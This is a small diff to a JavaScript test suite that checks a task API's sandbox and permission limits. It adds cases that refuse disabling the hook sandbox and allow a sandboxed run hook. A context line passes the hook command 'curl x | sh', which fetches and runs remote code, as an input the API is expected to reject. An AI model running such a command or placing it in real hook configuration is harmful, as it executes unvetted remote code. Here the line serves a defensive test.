@@ -253,6 +253,8 @@ describe('sandbox read-only, own-task scope', () => {
     });
     expect(await status(9, { status: 'in_review' })).toBe(403);
     expect(await status(7, { status: 'in_review', hookMode: 'command', hookCommand: 'curl x | sh' })).toBe(403);
+    expect(await status(7, { status: 'in_review', hookMode: 'run', hookSandbox: 'none' })).toBe(403);
+    expect(await status(7, { status: 'in_review', hookMode: 'run' })).toBe(200);
     expect((await request('POST', `/api/tasks?project=${PROJECT}`, token, { name: 'new' })).status).toBe(403);
 
     level('all');
